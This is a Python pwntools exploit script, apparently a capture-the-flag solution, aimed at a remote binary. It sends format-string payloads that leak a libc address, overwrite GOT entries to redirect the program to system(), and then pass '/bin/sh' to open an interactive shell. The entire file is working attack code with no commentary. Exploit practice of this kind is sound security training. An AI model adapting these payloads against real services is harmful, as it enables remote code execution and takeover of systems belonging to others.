from pwn import *

#p = process('./pwnable')
p = remote('stack.overflow.fail',9002)
elf = ELF('./pwnable')
#context.log_level = 'debug'
libc = ELF('libc.so')

#11 start 0x804851B
#sleep(1)
p.recvuntil('echo back.\n')
payload = 'AA%27$p%'+str(0x851b-12)+'d'+'%16$hnAA' + p32(0x804A01C)
p.sendline(payload)
p.recvuntil('0x')
data = p.recv(8)
data = int(data,16) - 247
print hex(data)

libc_base = data - libc.symbols['__libc_start_main']
#one_gadget = libc_base + 0x5fbc6
system_addr = libc_base + libc.symbols['system']
print hex(system_addr)

p.recvuntil('Give me a string to echo back.\n')

one1_ = system_addr % (16*16)
one2_ = (system_addr>>8) % (16*16*16*16)
print str(one1_)

payload2 = 'AA%'+str(one1_-2)+'d'+'%18$hhn%'
payload2 += str(one2_-len(payload2)-one1_+14)+'d%19$hnAAAA' + p32(0x804A010) + p32(0x804A011)
#gdb.attach(p)
p.sendline(payload2)

p.recvuntil('Give me a string to echo back.\n')
p.sendline('/bin/sh')

p.interactive()
